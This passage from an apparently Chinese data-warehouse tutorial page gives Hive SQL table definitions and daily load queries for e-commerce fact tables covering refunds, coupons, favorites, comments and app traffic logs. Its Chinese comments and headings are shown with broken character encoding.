rp.payment_type=dic.dic_code;</p><p><strong>ï¼ˆ2ï¼‰æ¯æ—¥è£…è½½</strong></p><p>insert overwrite table dwd_trade_refund_pay_suc_inc partition(dt=â€™2020-06-15â€™)</p><p>select</p><p>rp.id,</p><p>user_id,</p><p>rp.order_id,</p><p>rp.sku_id,</p><p>province_id,</p><p>payment_type,</p><p>dic_name,</p><p>date_format(callback_time,â€™yyyy-MM-ddâ€™) date_id,</p><p>callback_time,</p><p>refund_num,</p><p>total_amount</p><p>from</p><p>(</p><p>select</p><p>data.id,</p><p>data.order_id,</p><p>data.sku_id,</p><p>data.payment_type,</p><p>data.callback_time,</p><p>data.total_amount</p><p>from ods_refund_payment_inc</p><p>where dt=â€™2020-06-15â€™</p><p>and type = â€˜updateâ€™</p><p>and array_contains(map_keys(old),â€™refund_statusâ€™)</p><p>and data.refund_status=â€™1602â€™</p><p>)rp</p><p>left join</p><p>(</p><p>select</p><p>data.id,</p><p>data.user_id,</p><p>data.province_id</p><p>from ods_order_info_inc</p><p>where dt=â€™2020-06-15â€™</p><p>and type=â€™updateâ€™</p><p>and data.order_status=â€™1006â€™</p><p>and array_contains(map_keys(old),â€™order_statusâ€™)</p><p>)oi</p><p>on rp.order_id=oi.id</p><p>left join</p><p>(</p><p>select</p><p>data.order_id,</p><p>data.sku_id,</p><p>data.refund_num</p><p>from ods_order_refund_info_inc</p><p>where dt=â€™2020-06-15â€™</p><p>and type=â€™updateâ€™</p><p>and data.refund_status=â€™0705â€™</p><p>and array_contains(map_keys(old),â€™refund_statusâ€™)</p><p>)ri</p><p>on rp.order_id=ri.order_id</p><p>and rp.sku_id=ri.sku_id</p><p>left join</p><p>(</p><p>select</p><p>dic_code,</p><p>dic_name</p><p>from ods_base_dic_full</p><p>where dt=â€™2020-06-15â€™</p><p>and parent_code=â€™11â€™</p><p>)dic</p><p>on rp.payment_type=dic.dic_code;</p><h3 id="äº¤æ˜“åŸŸè´­ç‰©è½¦å‘¨æœŸå¿«ç…§äº‹å®è¡¨"><a href="#äº¤æ˜“åŸŸè´­ç‰©è½¦å‘¨æœŸå¿«ç…§äº‹å®è¡¨" class="headerlink" title="äº¤æ˜“åŸŸè´­ç‰©è½¦å‘¨æœŸå¿«ç…§äº‹å®è¡¨"></a>äº¤æ˜“åŸŸè´­ç‰©è½¦å‘¨æœŸå¿«ç…§äº‹å®è¡¨</h3><p><strong>1ï¼‰å»ºè¡¨è¯­å¥</strong></p><p>DROP TABLE IF EXISTS dwd_trade_cart_full;</p><p>CREATE EXTERNAL TABLE dwd_trade_cart_full</p><p>(</p><p>`id` STRING COMMENT â€˜ç¼–å·â€™,</p><p>`user_id` STRING COMMENT â€˜ç”¨æˆ·idâ€™,</p><p>`sku_id` STRING COMMENT â€˜å•†å“idâ€™,</p><p>`sku_name` STRING COMMENT â€˜å•†å“åç§°â€™,</p><p>`sku_num` BIGINT COMMENT â€˜åŠ è´­ç‰©è½¦ä»¶æ•°â€™</p><p>) COMMENT â€˜äº¤æ˜“åŸŸè´­ç‰©è½¦å‘¨æœŸå¿«ç…§äº‹å®è¡¨â€™</p><p>PARTITIONED BY (`dt` STRING)</p><p>ROW FORMAT DELIMITED FIELDS TERMINATED BY â€˜\tâ€™</p><p>STORED AS ORC</p><p>LOCATION â€˜/warehouse/gmall/dwd/dwd_trade_cart_full/â€˜</p><p>TBLPROPERTIES (â€˜orc.compressâ€™ = â€˜snappyâ€™);</p><p><strong>2ï¼‰æ•°æ®è£…è½½</strong></p><p>insert overwrite table dwd_trade_cart_full partition(dt=â€™2020-06-14â€™)</p><p>select</p><p>id,</p><p>user_id,</p><p>sku_id,</p><p>sku_name,</p><p>sku_num</p><p>from ods_cart_info_full</p><p>where dt=â€™2020-06-14â€™</p><p>and is_ordered=â€™0â€™;</p><h3 id="å·¥å…·åŸŸä¼˜æƒ åˆ¸é¢†å–äº‹åŠ¡äº‹å®è¡¨"><a href="#å·¥å…·åŸŸä¼˜æƒ åˆ¸é¢†å–äº‹åŠ¡äº‹å®è¡¨" class="headerlink" title="å·¥å…·åŸŸä¼˜æƒ åˆ¸é¢†å–äº‹åŠ¡äº‹å®è¡¨"></a>å·¥å…·åŸŸä¼˜æƒ åˆ¸é¢†å–äº‹åŠ¡äº‹å®è¡¨</h3><p><strong>1ï¼‰å»ºè¡¨è¯­å¥</strong></p><p>DROP TABLE IF EXISTS dwd_tool_coupon_get_inc;</p><p>CREATE EXTERNAL TABLE dwd_tool_coupon_get_inc</p><p>(</p><p>`id` STRING COMMENT â€˜ç¼–å·â€™,</p><p>`coupon_id` STRING COMMENT â€˜ä¼˜æƒ åˆ¸IDâ€™,</p><p>`user_id` STRING COMMENT â€˜useridâ€™,</p><p>`date_id` STRING COMMENT â€˜æ—¥æœŸIDâ€™,</p><p>`get_time` STRING COMMENT â€˜é¢†å–æ—¶é—´â€™</p><p>) COMMENT â€˜ä¼˜æƒ åˆ¸é¢†å–äº‹åŠ¡äº‹å®è¡¨â€™</p><p>PARTITIONED BY (`dt` STRING)</p><p>STORED AS ORC</p><p>LOCATION â€˜/warehouse/gmall/dwd/dwd_tool_coupon_get_inc/â€˜</p><p>TBLPROPERTIES (â€œorc.compressâ€ = â€œsnappyâ€);</p><p><strong>2ï¼‰æ•°æ®è£…è½½</strong></p><p><strong>ï¼ˆ1ï¼‰é¦–æ—¥è£…è½½</strong></p><p>insert overwrite table dwd_tool_coupon_get_inc partition(dt)</p><p>select</p><p>data.id,</p><p>data.coupon_id,</p><p>data.user_id,</p><p>date_format(data.get_time,â€™yyyy-MM-ddâ€™) date_id,</p><p>data.get_time,</p><p>date_format(data.get_time,â€™yyyy-MM-ddâ€™)</p><p>from ods_coupon_use_inc</p><p>where dt=â€™2020-06-14â€™</p><p>and type=â€™bootstrap-insertâ€™;</p><p><strong>ï¼ˆ2ï¼‰æ¯æ—¥è£…è½½</strong></p><p>insert overwrite table dwd_tool_coupon_get_inc partition (dt=â€™2020-06-15â€™)</p><p>select</p><p>data.id,</p><p>data.coupon_id,</p><p>data.user_id,</p><p>date_format(data.get_time,â€™yyyy-MM-ddâ€™) date_id,</p><p>data.get_time</p><p>from ods_coupon_use_inc</p><p>where dt=â€™2020-06-15â€™</p><p>and type=â€™insertâ€™;</p><h3 id="å·¥å…·åŸŸä¼˜æƒ åˆ¸ä½¿ç”¨-ä¸‹å•-äº‹åŠ¡äº‹å®è¡¨"><a href="#å·¥å…·åŸŸä¼˜æƒ åˆ¸ä½¿ç”¨-ä¸‹å•-äº‹åŠ¡äº‹å®è¡¨" class="headerlink" title="å·¥å…·åŸŸä¼˜æƒ åˆ¸ä½¿ç”¨(ä¸‹å•)äº‹åŠ¡äº‹å®è¡¨"></a>å·¥å…·åŸŸä¼˜æƒ åˆ¸ä½¿ç”¨(ä¸‹å•)äº‹åŠ¡äº‹å®è¡¨</h3><p><strong>1ï¼‰å»ºè¡¨è¯­å¥</strong></p><p>DROP TABLE IF EXISTS dwd_tool_coupon_order_inc;</p><p>CREATE EXTERNAL TABLE dwd_tool_coupon_order_inc</p><p>(</p><p>`id` STRING COMMENT â€˜ç¼–å·â€™,</p><p>`coupon_id` STRING COMMENT â€˜ä¼˜æƒ åˆ¸IDâ€™,</p><p>`user_id` STRING COMMENT â€˜user_idâ€™,</p><p>`order_id` STRING COMMENT â€˜order_idâ€™,</p><p>`date_id` STRING COMMENT â€˜æ—¥æœŸIDâ€™,</p><p>`order_time` STRING COMMENT â€˜ä½¿ç”¨ä¸‹å•æ—¶é—´â€™</p><p>) COMMENT â€˜ä¼˜æƒ åˆ¸ä½¿ç”¨ä¸‹å•äº‹åŠ¡äº‹å®è¡¨â€™</p><p>PARTITIONED BY (`dt` STRING)</p><p>STORED AS ORC</p><p>LOCATION â€˜/warehouse/gmall/dwd/dwd_tool_coupon_order_inc/â€˜</p><p>TBLPROPERTIES (â€œorc.compressâ€ = â€œsnappyâ€);</p><p><strong>2ï¼‰æ•°æ®è£…è½½</strong></p><p><strong>ï¼ˆ1ï¼‰é¦–æ—¥è£…è½½</strong></p><p>insert overwrite table dwd_tool_coupon_order_inc partition(dt)</p><p>select</p><p>data.id,</p><p>data.coupon_id,</p><p>data.user_id,</p><p>data.order_id,</p><p>date_format(data.using_time,â€™yyyy-MM-ddâ€™) date_id,</p><p>data.using_time,</p><p>date_format(data.using_time,â€™yyyy-MM-ddâ€™)</p><p>from ods_coupon_use_inc</p><p>where dt=â€™2020-06-14â€™</p><p>and type=â€™bootstrap-insertâ€™</p><p>and data.using_time is not null;</p><p><strong>ï¼ˆ2ï¼‰æ¯æ—¥è£…è½½</strong></p><p>insert overwrite table dwd_tool_coupon_order_inc partition(dt=â€™2020-06-15â€™)</p><p>select</p><p>data.id,</p><p>data.coupon_id,</p><p>data.user_id,</p><p>data.order_id,</p><p>date_format(data.using_time,â€™yyyy-MM-ddâ€™) date_id,</p><p>data.using_time</p><p>from ods_coupon_use_inc</p><p>where dt=â€™2020-06-15â€™</p><p>and type=â€™updateâ€™</p><p>and array_contains(map_keys(old),â€™using_timeâ€™);</p><h3 id="å·¥å…·åŸŸä¼˜æƒ åˆ¸ä½¿ç”¨-æ”¯ä»˜-äº‹åŠ¡äº‹å®è¡¨"><a href="#å·¥å…·åŸŸä¼˜æƒ åˆ¸ä½¿ç”¨-æ”¯ä»˜-äº‹åŠ¡äº‹å®è¡¨" class="headerlink" title="å·¥å…·åŸŸä¼˜æƒ åˆ¸ä½¿ç”¨(æ”¯ä»˜)äº‹åŠ¡äº‹å®è¡¨"></a>å·¥å…·åŸŸä¼˜æƒ åˆ¸ä½¿ç”¨(æ”¯ä»˜)äº‹åŠ¡äº‹å®è¡¨</h3><p><strong>1ï¼‰å»ºè¡¨è¯­å¥</strong></p><p>DROP TABLE IF EXISTS dwd_tool_coupon_pay_inc;</p><p>CREATE EXTERNAL TABLE dwd_tool_coupon_pay_inc</p><p>(</p><p>`id` STRING COMMENT â€˜ç¼–å·â€™,</p><p>`coupon_id` STRING COMMENT â€˜ä¼˜æƒ åˆ¸IDâ€™,</p><p>`user_id` STRING COMMENT â€˜user_idâ€™,</p><p>`order_id` STRING COMMENT â€˜order_idâ€™,</p><p>`date_id` STRING COMMENT â€˜æ—¥æœŸIDâ€™,</p><p>`payment_time` STRING COMMENT â€˜ä½¿ç”¨ä¸‹å•æ—¶é—´â€™</p><p>) COMMENT â€˜ä¼˜æƒ åˆ¸ä½¿ç”¨æ”¯ä»˜äº‹åŠ¡äº‹å®è¡¨â€™</p><p>PARTITIONED BY (`dt` STRING)</p><p>STORED AS ORC</p><p>LOCATION â€˜/warehouse/gmall/dwd/dwd_tool_coupon_pay_inc/â€˜</p><p>TBLPROPERTIES (â€œorc.compressâ€ = â€œsnappyâ€);</p><p><strong>2ï¼‰æ•°æ®è£…è½½</strong></p><p><strong>ï¼ˆ1ï¼‰é¦–æ—¥è£…è½½</strong></p><p>insert overwrite table dwd_tool_coupon_pay_inc partition(dt)</p><p>select</p><p>data.id,</p><p>data.coupon_id,</p><p>data.user_id,</p><p>data.order_id,</p><p>date_format(data.used_time,â€™yyyy-MM-ddâ€™) date_id,</p><p>data.used_time,</p><p>date_format(data.used_time,â€™yyyy-MM-ddâ€™)</p><p>from ods_coupon_use_inc</p><p>where dt=â€™2020-06-14â€™</p><p>and type=â€™bootstrap-insertâ€™</p><p>and data.used_time is not null;</p><p><strong>ï¼ˆ2ï¼‰æ¯æ—¥è£…è½½</strong></p><p>insert overwrite table dwd_tool_coupon_pay_inc partition(dt=â€™2020-06-15â€™)</p><p>select</p><p>data.id,</p><p>data.coupon_id,</p><p>data.user_id,</p><p>data.order_id,</p><p>date_format(data.used_time,â€™yyyy-MM-ddâ€™) date_id,</p><p>data.used_time</p><p>from ods_coupon_use_inc</p><p>where dt=â€™2020-06-15â€™</p><p>and type=â€™updateâ€™</p><p>and array_contains(map_keys(old),â€™used_timeâ€™);</p><h3 id="äº’åŠ¨åŸŸæ”¶è—å•†å“äº‹åŠ¡äº‹å®è¡¨"><a href="#äº’åŠ¨åŸŸæ”¶è—å•†å“äº‹åŠ¡äº‹å®è¡¨" class="headerlink" title="äº’åŠ¨åŸŸæ”¶è—å•†å“äº‹åŠ¡äº‹å®è¡¨"></a>äº’åŠ¨åŸŸæ”¶è—å•†å“äº‹åŠ¡äº‹å®è¡¨</h3><p><strong>1ï¼‰å»ºè¡¨è¯­å¥</strong></p><p>DROP TABLE IF EXISTS dwd_interaction_favor_add_inc;</p><p>CREATE EXTERNAL TABLE dwd_interaction_favor_add_inc</p><p>(</p><p>`id` STRING COMMENT â€˜ç¼–å·â€™,</p><p>`user_id` STRING COMMENT â€˜ç”¨æˆ·idâ€™,</p><p>`sku_id` STRING COMMENT â€˜sku_idâ€™,</p><p>`date_id` STRING COMMENT â€˜æ—¥æœŸidâ€™,</p><p>`create_time` STRING COMMENT â€˜æ”¶è—æ—¶é—´â€™</p><p>) COMMENT â€˜æ”¶è—äº‹å®è¡¨â€™</p><p>PARTITIONED BY (`dt` STRING)</p><p>STORED AS ORC</p><p>LOCATION â€˜/warehouse/gmall/dwd/dwd_interaction_favor_add_inc/â€˜</p><p>TBLPROPERTIES (â€œorc.compressâ€ = â€œsnappyâ€);</p><p><strong>2ï¼‰æ•°æ®è£…è½½</strong></p><p><strong>ï¼ˆ1ï¼‰é¦–æ—¥è£…è½½</strong></p><p>set hive.exec.dynamic.partition.mode=nonstrict;</p><p>insert overwrite table dwd_interaction_favor_add_inc partition(dt)</p><p>select</p><p>data.id,</p><p>data.user_id,</p><p>data.sku_id,</p><p>date_format(data.create_time,â€™yyyy-MM-ddâ€™) date_id,</p><p>data.create_time,</p><p>date_format(data.create_time,â€™yyyy-MM-ddâ€™)</p><p>from ods_favor_info_inc</p><p>where dt=â€™2020-06-14â€™</p><p>and type = â€˜bootstrap-insertâ€™;</p><p><strong>ï¼ˆ2ï¼‰æ¯æ—¥è£…è½½</strong></p><p>insert overwrite table dwd_interaction_favor_add_inc partition(dt=â€™2020-06-15â€™)</p><p>select</p><p>data.id,</p><p>data.user_id,</p><p>data.sku_id,</p><p>date_format(data.create_time,â€™yyyy-MM-ddâ€™) date_id,</p><p>data.create_time</p><p>from ods_favor_info_inc</p><p>where dt=â€™2020-06-15â€™</p><p>and type = â€˜insertâ€™;</p><h3 id="äº’åŠ¨åŸŸè¯„ä»·äº‹åŠ¡äº‹å®è¡¨"><a href="#äº’åŠ¨åŸŸè¯„ä»·äº‹åŠ¡äº‹å®è¡¨" class="headerlink" title="äº’åŠ¨åŸŸè¯„ä»·äº‹åŠ¡äº‹å®è¡¨"></a>äº’åŠ¨åŸŸè¯„ä»·äº‹åŠ¡äº‹å®è¡¨</h3><p><strong>1ï¼‰å»ºè¡¨è¯­å¥</strong></p><p>DROP TABLE IF EXISTS dwd_interaction_comment_inc;</p><p>CREATE EXTERNAL TABLE dwd_interaction_comment_inc</p><p>(</p><p>`id` STRING COMMENT â€˜ç¼–å·â€™,</p><p>`user_id` STRING COMMENT â€˜ç”¨æˆ·IDâ€™,</p><p>`sku_id` STRING COMMENT â€˜sku_idâ€™,</p><p>`order_id` STRING COMMENT â€˜è®¢å•IDâ€™,</p><p>`date_id` STRING COMMENT â€˜æ—¥æœŸIDâ€™,</p><p>`create_time` STRING COMMENT â€˜è¯„ä»·æ—¶é—´â€™,</p><p>`appraise_code` STRING COMMENT â€˜è¯„ä»·ç¼–ç â€™,</p><p>`appraise_name` STRING COMMENT â€˜è¯„ä»·åç§°â€™</p><p>) COMMENT â€˜è¯„ä»·äº‹åŠ¡äº‹å®è¡¨â€™</p><p>PARTITIONED BY (`dt` STRING)</p><p>STORED AS ORC</p><p>LOCATION â€˜/warehouse/gmall/dwd/dwd_interaction_comment_inc/â€˜</p><p>TBLPROPERTIES (â€œorc.compressâ€ = â€œsnappyâ€);</p><p><strong>2ï¼‰æ•°æ®è£…è½½</strong></p><p><strong>ï¼ˆ1ï¼‰é¦–æ—¥è£…è½½</strong></p><p>insert overwrite table dwd_interaction_comment_inc partition(dt)</p><p>select</p><p>id,</p><p>user_id,</p><p>sku_id,</p><p>order_id,</p><p>date_format(create_time,â€™yyyy-MM-ddâ€™) date_id,</p><p>create_time,</p><p>appraise,</p><p>dic_name,</p><p>date_format(create_time,â€™yyyy-MM-ddâ€™)</p><p>from</p><p>(</p><p>select</p><p>data.id,</p><p>data.user_id,</p><p>data.sku_id,</p><p>data.order_id,</p><p>data.create_time,</p><p>data.appraise</p><p>from ods_comment_info_inc</p><p>where dt=â€™2020-06-14â€™</p><p>and type=â€™bootstrap-insertâ€™</p><p>)ci</p><p>left join</p><p>(</p><p>select</p><p>dic_code,</p><p>dic_name</p><p>from ods_base_dic_full</p><p>where dt=â€™2020-06-14â€™</p><p>and parent_code=â€™12â€™</p><p>)dic</p><p>on ci.appraise=dic.dic_code;</p><p><strong>ï¼ˆ2ï¼‰æ¯æ—¥è£…è½½</strong></p><p>insert overwrite table dwd_interaction_comment_inc partition(dt=â€™2020-06-15â€™)</p><p>select</p><p>id,</p><p>user_id,</p><p>sku_id,</p><p>order_id,</p><p>date_format(create_time,â€™yyyy-MM-ddâ€™) date_id,</p><p>create_time,</p><p>appraise,</p><p>dic_name</p><p>from</p><p>(</p><p>select</p><p>data.id,</p><p>data.user_id,</p><p>data.sku_id,</p><p>data.order_id,</p><p>data.create_time,</p><p>data.appraise</p><p>from ods_comment_info_inc</p><p>where dt=â€™2020-06-15â€™</p><p>and type=â€™insertâ€™</p><p>)ci</p><p>left join</p><p>(</p><p>select</p><p>dic_code,</p><p>dic_name</p><p>from ods_base_dic_full</p><p>where dt=â€™2020-06-15â€™</p><p>and parent_code=â€™12â€™</p><p>)dic</p><p>on ci.appraise=dic.dic_code;</p><h3 id="æµé‡åŸŸé¡µé¢æµè§ˆäº‹åŠ¡äº‹å®è¡¨"><a href="#æµé‡åŸŸé¡µé¢æµè§ˆäº‹åŠ¡äº‹å®è¡¨" class="headerlink" title="æµé‡åŸŸé¡µé¢æµè§ˆäº‹åŠ¡äº‹å®è¡¨"></a>æµé‡åŸŸé¡µé¢æµè§ˆäº‹åŠ¡äº‹å®è¡¨</h3><p><strong>1ï¼‰å»ºè¡¨è¯­å¥</strong></p><p>DROP TABLE IF EXISTS dwd_traffic_page_view_inc;</p><p>CREATE EXTERNAL TABLE dwd_traffic_page_view_inc</p><p>(</p><p>`province_id` STRING COMMENT â€˜çœä»½idâ€™,</p><p>`brand` STRING COMMENT â€˜æ‰‹æœºå“ç‰Œâ€™,</p><p>`channel` STRING COMMENT â€˜æ¸ é“â€™,</p><p>`is_new` STRING COMMENT â€˜æ˜¯å¦é¦–æ¬¡å¯åŠ¨â€™,</p><p>`model` STRING COMMENT â€˜æ‰‹æœºå‹å·â€™,</p><p>`mid_id` STRING COMMENT â€˜è®¾å¤‡idâ€™,</p><p>`operate_system` STRING COMMENT â€˜æ“ä½œç³»ç»Ÿâ€™,</p><p>`user_id` STRING COMMENT â€˜ä¼šå‘˜idâ€™,</p><p>`version_code` STRING COMMENT â€˜appç‰ˆæœ¬å·â€™,</p><p>`page_item` STRING COMMENT â€˜ç›®æ ‡id â€˜,</p><p>`page_item_type` STRING COMMENT â€˜ç›®æ ‡ç±»å‹â€™,</p><p>`last_page_id` STRING COMMENT â€˜ä¸Šé¡µç±»å‹â€™,</p><p>`page_id` STRING COMMENT â€˜é¡µé¢ID â€˜,</p><p>`source_type` STRING COMMENT â€˜æ¥æºç±»å‹â€™,</p><p>`date_id` STRING COMMENT â€˜æ—¥æœŸidâ€™,</p><p>`view_time` STRING COMMENT â€˜è·³å…¥æ—¶é—´â€™,</p><p>`session_id` STRING COMMENT â€˜æ‰€å±ä¼šè¯idâ€™,</p><p>`during_time` BIGINT COMMENT â€˜æŒç»­æ—¶é—´æ¯«ç§’â€™</p><p>) COMMENT â€˜é¡µé¢æ—¥å¿—è¡¨â€™</p><p>PARTITIONED BY (`dt` STRING)</p><p>STORED AS ORC</p><p>LOCATION â€˜/warehouse/gmall/dwd/dwd_traffic_page_view_incâ€™</p><p>TBLPROPERTIES (â€˜orc.compressâ€™ = â€˜snappyâ€™);</p><p><strong>2ï¼‰æ•°æ®è£…è½½</strong></p><p>set hive.cbo.enable=false;</p><p>insert overwrite table dwd_traffic_page_view_inc partition (dt=â€™2020-06-14â€™)</p><p>select</p><p>province_id,</p><p>brand,</p><p>channel,</p><p>is_new,</p><p>model,</p><p>mid_id,</p><p>operate_system,</p><p>user_id,</p><p>version_code,</p><p>page_item,</p><p>page_item_type,</p><p>last_page_id,</p><p>page_id,</p><p>source_type,</p><p>date_format(from_utc_timestamp(ts,â€™GMT+8â€™),â€™yyyy-MM-ddâ€™) date_id,</p><p>date_format(from_utc_timestamp(ts,â€™GMT+8â€™),â€™yyyy-MM-dd HH:mm:ssâ€™) view_time,</p><p>concat(mid_id,â€™-â€˜,last_value(session_start_point,true) over (partition by mid_id<br>order by ts)) session_id,</p><p>during_time</p><p>from</p><p>(</p><p>select</p><p>common.ar area_code,</p><p>common.ba brand,</p><p>common.ch channel,</p><p>common.is_new is_new,</p><p>common.md model,</p><p>common.mid mid_id,</p><p>common.os operate_system,</p><p>common.uid user_id,</p><p>common.vc version_code,</p><p>page.during_time,</p><p>page.item page_item,</p><p>page.item_type page_item_type,</p><p>page.last_page_id,</p><p>page.page_id,</p><p>page.source_type,</p><p>ts,</p><p>if(page.last_page_id is null,ts,null) session_start_point</p><p>from ods_log_inc</p><p>where dt=â€™2020-06-14â€™</p><p>and page is not null</p><p>)log</p><p>left join</p><p>(</p><p>select</p><p>id province_id,</p><p>area_code</p><p>from ods_base_province_full</p><p>where dt=â€™2020-06-14â€™</p><p>)bp</p><p>on log.area_code=bp.area_code;</p><h3 id="æµé‡åŸŸå¯åŠ¨äº‹åŠ¡äº‹å®è¡¨"><a href="#æµé‡åŸŸå¯åŠ¨äº‹åŠ¡äº‹å®è¡¨" class="headerlink" title="æµé‡åŸŸå¯åŠ¨äº‹åŠ¡äº‹å®è¡¨"></a>æµé‡åŸŸå¯åŠ¨äº‹åŠ¡äº‹å®è¡¨</h3><p><strong>1ï¼‰å»ºè¡¨è¯­å¥</strong></p><p>DROP TABLE IF EXISTS dwd_traffic_start_inc;</p><p>CREATE EXTERNAL TABLE dwd_traffic_start_inc</p><p>(</p><p>`province_id` STRING COMMENT â€˜çœä»½idâ€™,</p><p>`brand` STRING COMMENT â€˜æ‰‹æœºå“ç‰Œâ€™,</p><p>`channel` STRING COMMENT â€˜æ¸ é“â€™,</p><p>`is_new` STRING COMMENT â€˜æ˜¯å¦é¦–æ¬¡å¯åŠ¨â€™,</p><p>`model` STRING COMMENT â€˜æ‰‹æœºå‹å·â€™,</p><p>`mid_id` STRING COMMENT â€˜è®¾å¤‡idâ€™,</p><p>`operate_system` STRING COMMENT â€˜æ“ä½œç³»ç»Ÿâ€™,</p><p>`user_id` STRING COMMENT â€˜ä¼šå‘˜idâ€™,</p><p>`version_code` STRING COMMENT â€˜appç‰ˆæœ¬å·â€™,</p><p>`entry` STRING COMMENT â€˜iconæ‰‹æœºå›¾æ ‡ notice é€šçŸ¥â€™,</p><p>`open_ad_id` STRING COMMENT â€˜å¹¿å‘Šé¡µID â€˜,</p><p>`date_id` STRING COMMENT â€˜æ—¥æœŸidâ€™,</p><p>`start_time` STRING COMMENT â€˜å¯åŠ¨æ—¶é—´â€™,</p><p>`loading_time_ms` BIGINT COMMENT â€˜å¯åŠ¨åŠ è½½æ—¶é—´â€™,</p><p>`open_ad_ms` BIGINT COMMENT â€˜å¹¿å‘Šæ€»å…±æ’­æ”¾æ—¶é—´â€™,</p><p>`open_ad_skip_ms` BIGINT COMMENT â€˜ç”¨æˆ·è·³è¿‡å¹¿å‘Šæ—¶ç‚¹â€™</p><p>) COMMENT â€˜å¯åŠ¨æ—¥å¿—è¡¨â€™</p><p>PARTITIONED BY (`dt` STRING)</p><p>STORED AS ORC</p><p>LOCATION â€˜/warehouse/gmall/dwd/dwd_traffic_start_incâ€™</p><p>TBLPROPERTIES (â€˜orc.compressâ€™ = â€˜snappyâ€™);</p><p><strong>2ï¼‰æ•°æ®è£…è½½</strong></p><p>set hive.cbo.enable=false;</p><p>insert overwrite table dwd_traffic_start_inc partition(dt=â€™2020-06-14â€™)</p><p>select</p><p>province_id,</p><p>brand,</p><p>channel,</p><p>is_new,</p><p>model,</p><p>mid_id,</p><p>operate_system,</p><p>user_id,</p><p>version_code,</p><p>entry,</p><p>open_ad_id,</p><p>date_format(from_utc_timestamp(ts,â€™GMT+8â€™),â€™yyyy-MM-ddâ€™) date_id,</p><p>date_format(from_utc_timestamp(ts,â€™GMT+8â€™),â€™yyyy-MM-dd HH:mm:ssâ€™) action_time,</p><p>loading_time,</p><p>open_ad_ms,</p><p>open_ad_skip_ms</p><p>from</p><p>(</p><p>select</p><p>common.ar area_code,</p><p>common.ba brand,</p><p>common.ch channel,</p><p>common.is_new,</p><p>common.md model,</p><p>common.mid mid_id,</p><p>common.os operate_system,</p><p>common.uid user_id,</p><p>common.vc version_code,</p><p>`start`.entry,</p><p>`start`.loading_time,</p><p>`start`.open_ad_id,</p><p>`start`.open_ad_ms,</p><p>`start`.open_ad_skip_ms,</p><p>ts</p><p>from ods_log_inc</p><p>where dt=â€™2020-06-14â€™</p><p>and `start` is not null</p><p>)log</p><p>left join</p><p>(</p><p>select</p><p>id province_id,</p><p>area_code</p><p>from ods_base_province_full</p><p>where dt=â€™2020-06-14â€™</p><p>)bp</p><p>on log.area_code=bp.area_code;</p><h3 id="æµé‡åŸŸåŠ¨ä½œäº‹åŠ¡äº‹å®è¡¨"><a href="#æµé‡åŸŸåŠ¨ä½œäº‹åŠ¡äº‹å®è¡¨" class="headerlink" title="æµé‡åŸŸåŠ¨ä½œäº‹åŠ¡äº‹å®è¡¨"></a>æµé‡åŸŸåŠ¨ä½œäº‹åŠ¡äº‹å®è¡¨</h3><p><strong>1ï¼‰å»ºè¡¨è¯­å¥</strong></p><p>DROP TABLE IF EXISTS dwd_traffic_action_inc;</p><p>CREATE EXTERNAL TABLE dwd_traffic_action_inc</p><p>(</p><p>`province_id` STRING COMMENT â€˜çœä»½idâ€™,</p><p>`brand` STRING COMMENT â€˜æ‰‹æœºå“ç‰Œâ€™,</p><p>`channel` STRING COMMENT â€˜æ¸ é“â€™,</p><p>`is_new` STRING COMMENT â€˜æ˜¯å¦é¦–æ¬¡å¯åŠ¨â€™,</p><p>`model` STRING COMMENT â€˜æ‰‹æœºå‹å·â€™,</p><p>`mid_id` STRING COMMENT â€˜è®¾å¤‡idâ€™,</p><p>`operate_system` STRING COMMENT â€˜æ“ä½œç³»ç»Ÿâ€™,</p><p>`user_id` STRING COMMENT â€˜ä¼šå‘˜idâ€™,</p><p>`version_code` STRING COMMENT â€˜appç‰ˆæœ¬å·â€™,</p><p>`during_time` BIGINT COMMENT â€˜æŒç»­æ—¶é—´æ¯«ç§’â€™,</p><p>`page_item` STRING COMMENT â€˜ç›®æ ‡id â€˜,</p><p>`page_item_type` STRING COMMENT â€˜ç›®æ ‡ç±»å‹â€™,</p><p>`last_page_id` STRING COMMENT â€˜ä¸Šé¡µç±»å‹â€™,</p><p>`page_id` STRING COMMENT â€˜é¡µé¢id â€˜,</p><p>`source_type` STRING COMMENT â€˜æ¥æºç±»å‹â€™,</p><p>`action_id` STRING COMMENT â€˜åŠ¨ä½œidâ€™,</p><p>`action_item` STRING COMMENT â€˜ç›®æ ‡id â€˜,</p><p>`action_item_type` STRING COMMENT â€˜ç›®æ ‡ç±»å‹â€™,</p><p>`date_id` STRING COMMENT â€˜æ—¥æœŸidâ€™,</p><p>`action_time` STRING COMMENT â€˜åŠ¨ä½œå‘ç”Ÿæ—¶é—´â€™</p><p>) COMMENT â€˜åŠ¨ä½œæ—¥å¿—è¡¨â€™</p><p>PARTITIONED BY (`dt` STRING)</p><p>STORED AS ORC</p><p>LOCATION â€˜/warehouse/gmall/dwd/dwd_traffic_action_incâ€™</p><p>TBLPROPERTIES (â€˜orc.compressâ€™ = â€˜snappyâ€™);</p><p><strong>2ï¼‰æ•°æ®è£…è½½</strong></p><p>set hive.cbo.enable=false;</p><p>insert overwrite table dwd_traffic_action_inc partition(dt=â€™2020-06-14â€™)</p><p>select</p><p>province_id,</p><p>brand,</p><p>channel,</p><p>is_new,</p><p>model,</p><p>mid_id,</p><p>operate_system,</p><p>user_id,</p><p>version_code,</p><p>during_time,</p><p>page_item,</p><p>page_item_type,</p><p>last_page_id,</p><p>page_id,</p><p>source_type,</p><p>action_id,</p><p>action_item,</p><p>action_item_type,</p><p>date_format(from_utc_timestamp(ts,â€™GMT+8â€™),â€™yyyy-MM-ddâ€™) date_id,</p><p>date_format(from_utc_timestamp(ts,â€™GMT+8â€™),â€™yyyy-MM-dd HH:mm:ssâ€™) action_time</p><p>from</p><p>(</p><p>select</p><p>common.ar area_code,</p><p>common.ba brand,</p><p>common.ch channel,</p><p>common.is_new,</p><p>common.md model,</p><p>common.mid mid_id,</p><p>common.os operate_system,</p><p>common.uid user_id,</p><p>common.vc version_code,</p><p>page.during_time,</p><p>page.item page_item,</p><p>page.item_type page_item_type,</p><p>page.last_page_id,</p><p>page.page_id,</p><p>page.source_type,</p><p>action.action_id,</p><p>action.item action_item,</p><p>action.item_type action_item_type,</p><p>action.ts</p><p>from ods_log_inc lateral view explode(actions) tmp as action</p><p>where dt=â€™2020-06-14â€™</p><p>and actions is not null</p><p>)log</p><p>left join</p><p>(</p><p>select</p><p>id province_id,</p><p>area_code</p><p>from ods_base_province_full</p><p>where dt=â€™2020-06-14â€™</p><p>)bp</p><p>on log.area_code=bp.area_code;</p><h3 